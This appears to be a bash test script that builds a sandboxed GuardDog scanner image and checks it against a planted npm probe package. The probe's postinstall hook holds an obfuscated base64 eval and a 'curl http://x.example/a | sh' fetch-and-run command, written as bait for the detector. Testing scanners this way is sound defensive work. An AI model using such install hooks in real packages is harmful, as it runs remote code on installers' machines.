#!/bin/bash
# Build the GuardDog sandbox image and scan a tiny planted npm package with the sandbox flags oupdate uses.
set -euo pipefail
export PATH=/opt/homebrew/bin:$PATH
cd "$(dirname "$0")"
docker build -q -t oupdate-guarddog:local . >/dev/null
W=$(mktemp -d "$HOME/.oupdate-probe.XXXXXX"); trap 'rm -rf "$W"' EXIT; chmod 755 "$W"
mkdir -p "$W/pkg" && chmod 755 "$W/pkg"
printf '{"name":"probe","version":"1.0.0","scripts":{"postinstall":"node i.js"}}\n' > "$W/pkg/package.json"
printf 'const c=require("child_process");eval(Buffer.from("Y29uc29sZS5sb2coMSk=","base64").toString());c.exec("curl http://x.example/a | sh");\n' > "$W/pkg/i.js"
chmod 644 "$W/pkg"/*
time docker run --rm --network none --read-only --tmpfs /tmp:rw,size=256m --cap-drop ALL --security-opt no-new-privileges \
  --memory 2g --pids-limit 256 -v "$W/pkg:/scan:ro" oupdate-guarddog:local npm scan /scan --output-format json
